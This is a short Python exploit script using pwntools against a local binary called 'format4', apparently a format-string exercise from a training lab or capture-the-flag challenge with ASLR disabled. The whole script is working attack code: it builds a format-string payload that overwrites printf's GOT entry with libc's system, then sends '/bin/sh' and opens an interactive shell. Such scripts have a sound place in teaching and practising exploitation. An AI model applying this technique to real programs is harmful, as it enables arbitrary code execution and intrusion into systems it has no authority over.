from pwn import *

elf = context.binary = ELF('./format4')
libc = elf.libc
libc.address = 0xf7d64000       # ASLR disabled

p = process()

payload = fmtstr_payload(4, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()